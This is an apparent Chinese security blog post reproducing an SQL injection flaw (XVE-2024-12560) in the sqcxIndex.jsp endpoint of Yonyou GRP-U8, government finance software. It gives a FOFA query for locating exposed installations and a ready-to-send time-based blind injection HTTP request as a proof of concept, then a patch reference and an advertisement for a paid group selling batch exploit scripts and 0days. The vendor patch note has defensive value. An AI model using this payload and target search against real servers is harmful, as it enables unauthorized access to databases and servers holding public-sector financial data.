#  『漏洞复现』用友GRP-U8 sqcxIndex.jsp SQL注入漏洞(XVE-2024-12560)   
冷漠安全  冷漠安全   2024-05-27 19:12  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友GRP-U8R10行政事业内控管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件  
。  
  
0x03  
  
**漏洞威胁**  
  
用友GRP-U8R10行政事业内控管理软件 sqcxIndex.jsp 接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。  
  
影响范围：  
  
用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="用友-GRP-U8"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rYOScvrABWMagibMRrnKHT5H2sx8MW3qEfCyOj7UFb2rCCsjUrGV2QUsMtX84Kx2DONCtQCDlhRaA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /u8qx/sqcxIndex.jsp?key=1');+waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
延时注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rYOScvrABWMagibMRrnKHT5efUREzJf0UYSh6la1icRrt09tbJEEFKv2RjoaXgLJv6ECatO1k46ibDw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rYOScvrABWMagibMRrnKHT5xILcZonHunwfa4CnJXyGICWQLE8pfA4yAllu6a4ia2PhIxAh1ZxWYPw/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
进行SQL的预编译处理，拦截页面传参的SQL注入，修改注入点datalist.jsp、sqcxList.jsp、sqcxIndex.jsp代码。  
  
补丁名称：【20230523-关于用友GRP-U8存在SQL注入漏洞(通过datalist或sqcxIndex或sqcxList)的解决方案】  
```
https://security.yonyou.com/#/patchInfo?identifier=ad9bfc6d0ad647c8b912dd29c8fb1d00
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rYOScvrABWMagibMRrnKHT5266yQNkIqI76BJ7Ecuniaf5RqcPvMC8SZ7AFWIvl1xLo4hiaHicjpxagA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rYOScvrABWMagibMRrnKHT5GjmbGWicgGYKOwtY75SAcsZu7TVPMATUlBBRx0U4g8fv12yNdEBWYDw/640?wx_fmt=gif&from=appmsg "")  
  
  
